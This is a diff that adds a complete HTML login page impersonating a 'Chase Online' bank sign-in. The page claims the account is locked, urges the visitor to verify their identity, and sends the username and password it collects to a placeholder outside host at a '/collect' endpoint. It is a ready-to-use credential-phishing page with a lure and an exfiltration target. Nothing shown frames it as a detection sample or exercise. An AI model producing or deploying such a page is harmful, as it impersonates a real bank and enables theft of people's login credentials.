@@ -1,0 +1,26 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Chase Online - Sign in</title>
+  <style>
+    body{font-family:Arial,sans-serif;background:#f4f4f4;margin:0}
+    .card{background:#fff;max-width:380px;margin:60px auto;padding:32px;border-radius:6px;box-shadow:0 1px 4px rgba(0,0,0,.2)}
+    label{display:block;margin-top:14px;font-size:14px}
+    input{width:100%;padding:10px;margin-top:4px;box-sizing:border-box}
+    button{margin-top:18px;width:100%;padding:12px;background:#117aca;color:#fff;border:0;font-size:16px}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <img src="/static/logo.png" alt="Chase" width="120" height="40">
+    <h2>Sign in to your account</h2>
+    <p>Your account has been temporarily locked. Verify your identity to restore access.</p>
+    <form id="login" method="post" action="{{OTHER_ORIGIN}}/collect">
+      <label>Username <input type="text" name="username" id="username" autocomplete="username"></label>
+      <label>Password <input type="password" name="password" id="password" autocomplete="current-password"></label>
+      <button type="submit">Sign in</button>
+    </form>
+  </div>
+</body>
+</html>
